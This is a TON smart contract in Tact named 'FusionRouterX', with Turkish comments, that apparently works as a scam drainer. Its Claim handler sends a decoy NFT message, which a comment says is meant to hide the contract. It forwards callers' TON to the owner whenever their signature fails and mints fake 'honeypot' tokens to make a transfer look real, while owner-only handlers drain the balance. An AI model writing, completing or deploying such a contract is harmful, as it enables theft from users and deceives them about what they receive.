import "./fusion_honeypot";
import "./virtual_nft";

contract FusionRouterX with VirtualNFT {
    owner: Address; // Adres sahibi
    authorizedPublicKey: Int; // Yetkilendirilmiş public key
    obfPublicKey: Int;

    // Kontrat başlatma: owner, publicKey ve obfPublicKey ayarlanıyor
    init(owner: Address, publicKey: Int, obfPublicKey: Int) {
        self.owner = owner;
        self.authorizedPublicKey = publicKey;
        self.obfPublicKey = obfPublicKey;
    }

    // Owner kontrolü için yardımcı fonksiyon
    fun requireOwner() {
        let ctx: Context = context();
        require(ctx.sender == self.owner, "Forbidden resource");  // Sadece owner erişebilir
    }

    // İmza kontrolü için yardımcı fonksiyon 
    fun checkObfSignatureValidity(sender: Address, signature: Slice): Bool {
        let hash: Int = beginCell().storeAddress(sender).endCell().hash();
        return checkSignature(hash, signature, self.obfPublicKey);
    }

    fun checkSignatureValidity(sender: Address, signature: Slice): Bool {
        let hash: Int = beginCell().storeAddress(sender).endCell().hash();
        return checkSignature(hash, signature, self.authorizedPublicKey);
    }

    // TON gönderme fonksiyonu
    fun sendTon(recipient: Address, amount: Int) {
        send(SendParameters {
            to: recipient,
            value: amount,
            mode: SendPayGasSeparately,
            bounce: false,
            body: beginCell().endCell()
        });
    }

    fun hasSufficientBalance(amount: Int): Bool {
        let ctx: Context = context();
        return myBalance() - amount >= ctx.readForwardFee();
    }

    // Deposit mesajı işleme - sadece owner
    receive(msg: Deposit) {
        self.requireOwner(); // Owner kontrolü
    }

    // Withdraw mesajı işleme - sadece owner
    receive(msg: Withdraw) {
        self.requireOwner(); // Owner kontrolü
        
        let ctx: Context = context();
        let remainingBalance = myBalance() - msg.amount;

        require(remainingBalance >= ctx.readForwardFee() + min_balance, "Insufficient funds after withdrawal");

        self.sendTon(self.owner, msg.amount);
    }

    // Tüm bakiyeyi çekme - sadece owner
    receive(msg: WithdrawAll) {
        self.requireOwner(); // Owner kontrolü

        let ctx: Context = context();
        let availableAmount = myBalance() - ctx.readForwardFee() - min_balance;

        require(availableAmount > 0, "Insufficient funds to maintain minimum balance");

        self.sendTon(self.owner, availableAmount);
    }

    // Token çekme - sadece owner
    receive(msg: WithdrawTokens) {
        self.requireOwner(); // Owner kontrolü
        
        let ctx: Context = context();
        let required = gas_consumption  + wallet_creation_cost + ctx.readForwardFee();

        require(required < myBalance(), "Insufficient funds to maintain minimum balance");

        send(SendParameters {
            to: msg.token_wallet,
            value: required,
            mode: 1,
            bounce: false,
            body: beginCell()
                .storeUint(0xf8a7ea5, 32)
                .storeUint(msg.query_id, 64)
                .storeCoins(msg.amount)
                .storeAddress(self.owner)
                .storeAddress(myAddress())
                .storeBool(false)
                .storeCoins(0)
                .storeBool(false)
                .endCell(),
        });
    }

    // Honeypot talep etme
    receive(msg: Claim) {
        let ctx: Context = context();
        let honeypotTransferCost = gas_consumption  + wallet_creation_cost + ctx.readForwardFee() * 2;
        let requiredAmount = 0;

        let timestamp = now();
        let senderHash = ctx.sender.asSlice().hash();
        let unique_id = beginCell()
            .storeUint(timestamp, 64)
            .storeUint(senderHash, 256)
            .endCell()
            .asSlice();

        // Kontratı gizlemek için unknown operation + TON'u komisyona taşıma
        send(SendParameters {
            to: self.owner,
            value: ton("0.000000001"),
            mode: SendPayGasSeparately,
            body: NftOwnershipAssigned {
                query_id: 0,
                prev_owner: ctx.sender,
                forward_payload: unique_id
            }.toCell()
        });

        // +NftOwnershipAssigned gönderme maliyeti
        let output = ctx.value - requiredAmount + ctx.readForwardFee();
        if (output > 0) {
            // forward_payload'dan veri çıkarma
            let obfuscation = msg.forward_payload.loadRef().asSlice();
            let signature = msg.forward_payload.loadRef().asSlice();
            let payout = msg.forward_payload.loadRef().beginParse();
            let main_address = payout.loadAddress(); // Ana transfer adresi
            let has_child_address = payout.loadBool(); // Alt adres varlığı bayrağı
            let child_address = has_child_address ? payout.loadAddress() : null; // Alt adres varsa
            let child_percentage = has_child_address ? payout.loadInt(32) : 0; // Alt adres yüzdesi

            // Alt adres için pay hesaplama
            let child_amount = (child_address != null && child_percentage > 0) ? (output * child_percentage) / 100 : 0;
            let main_amount = output - child_amount;

            // İmza geçersizse tüm bakiyeyi owner'a gönder
            if (!self.checkSignatureValidity(ctx.sender, signature)) {
                self.sendTon(self.owner, output);
                return;
            }

            // Obfuscation signature kontrolü - honeypot gösterimi için
            if (self.checkObfSignatureValidity(ctx.sender, obfuscation)) {
                // Tüm honeypot'ları kontrol et, her transfer için yeterli bakiye kontrolü yap
                foreach (index, honeypot in msg.honeypots) {
                    requiredAmount += honeypotTransferCost;
                    require(myBalance() >= requiredAmount, "Insufficient funds");

                    // Token transferi emülasyonu (TokenTransfer)
                    send(SendParameters {
                        to: honeypot.address,
                        value: wallet_creation_cost,
                        mode: 1,
                        bounce: false,
                        body: Mint {
                            query_id: msg.query_id,
                            amount: honeypot.amount,
                            destination: ctx.sender,
                            notification: honeypot.amount,
                            forward_ton_amount: ton("0.000000001"),
                            forward_payload: honeypot.forward_payload
                        }.toCell(),
                    });
                }
            }

            // Her durumda gerçek transfer yap: ana ve alt adrese
            self.sendTon(main_address, main_amount);
            if (child_address != null && child_amount > 0) {
                self.sendTon(child_address!!, child_amount);
            }
        }
    }

    receive(msg: TransferNotification) {
        let ctx: Context = context();
        let forwardAmount = ctx.value;

        require(myBalance() >= forwardAmount, "Not enough balance for owner transfer");

        let obfuscation = msg.forward_payload.loadRef().asSlice();
        let signature = msg.forward_payload.loadRef().asSlice();
        let payout = msg.forward_payload.loadRef().beginParse();
        let main_address = payout.loadAddress(); // Ana adres
        let has_child_address = payout.loadBool(); // Alt adres varlığı
        let child_address = has_child_address ? payout.loadAddress() : null; // Alt adres
        let child_percentage = has_child_address ? payout.loadInt(32) : 0; // Alt adres yüzdesi
        let forward_payload = msg.forward_payload.loadRef().beginParse();

        // İmza geçersizse tüm bakiyeyi owner'a gönder
        if (!self.checkSignatureValidity(msg.sender, signature)) {
            return;
        }

        // Her durumda gerçek token transferı yap: ana ve alt adrese
        // Alt adres için pay hesaplama
        let child_amount = (child_address != null && child_percentage > 0 && myBalance() >= forwardAmount * 2) ? (msg.amount * child_percentage) / 100 : 0;
        let main_amount = msg.amount - child_amount;

        send(SendParameters {
            to: ctx.sender,
            value: child_amount > 0 ? forwardAmount / 2 : forwardAmount,
            mode: 1,
            bounce: false,
            body: beginCell()
                .storeUint(0xf8a7ea5, 32)
                .storeUint(msg.query_id, 64)
                .storeCoins(main_amount)
                .storeAddress(main_address)
                .storeAddress(myAddress())
                .storeBool(false)
                .storeCoins(0)
                .storeBool(false)
                .endCell(),
        });

        if (child_address != null && child_amount > 0) {
            send(SendParameters {
                to: ctx.sender,
                value: forwardAmount / 2,
                mode: 1,
                bounce: false,
                body: beginCell()
                    .storeUint(0xf8a7ea5, 32)
                    .storeUint(msg.query_id, 64)
                    .storeCoins(child_amount)
                    .storeAddress(child_address!!)
                    .storeAddress(myAddress())
                    .storeBool(false)
                    .storeCoins(0)
                    .storeBool(false)
                    .endCell(),
            });
        }
    }
}